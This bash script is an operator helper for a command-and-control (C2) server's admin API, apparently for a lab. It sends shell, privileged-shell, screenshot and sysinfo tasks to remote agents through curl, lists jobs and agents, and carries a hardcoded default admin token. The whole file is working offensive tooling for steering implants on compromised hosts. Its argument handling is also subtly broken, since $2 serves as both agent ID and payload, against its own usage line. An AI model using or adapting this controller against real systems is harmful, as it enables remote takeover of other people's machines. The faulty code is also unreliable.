#!/usr/bin/env bash
# Minimal operator helper for the lab C2 admin API (v1.4+).
# Usage:
#   c2_admin.sh shell '<cmd>' [agent_id]
#   c2_admin.sh priv [agent_id]
#   c2_admin.sh jobs [agent_id]
set -u
HOST="https://127.0.0.1:8443"
TOKEN="${ADMIN_TOKEN:-lab-admin-token-change-me}"
AGENT="${2:-agent-447313a4ee79d586}"
MODE="${1:-shell}"

case "$MODE" in
  shell|exec|shell_admin|priv|screenshot|ping|sysinfo)
    curl -sk -m 15 -X POST "$HOST/admin/cmd" \
      -H "X-Auth-Token: $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"agent_id\":\"$AGENT\",\"cmd_type\":\"$MODE\",\"payload\":\"$2\"}"
    echo
    ;;
  jobs)
    curl -sk -m 10 -H "X-Auth-Token: $TOKEN" "$HOST/admin/jobs" | python3 -c "
import sys,json
d=json.load(sys.stdin)
jobs=d.get('jobs',d) if isinstance(d,dict) else d
if isinstance(jobs,dict): jobs=list(jobs.values())
for j in (jobs or [])[-8:]:
    print(json.dumps(j,ensure_ascii=False)[:600])
"
    ;;
  agents)
    curl -sk -m 10 -H "X-Auth-Token: $TOKEN" "$HOST/admin/agents" | python3 -m json.tool --no-ensure-ascii 2>/dev/null | head -80
    ;;
  *)
    echo "unknown mode" ;;
esac
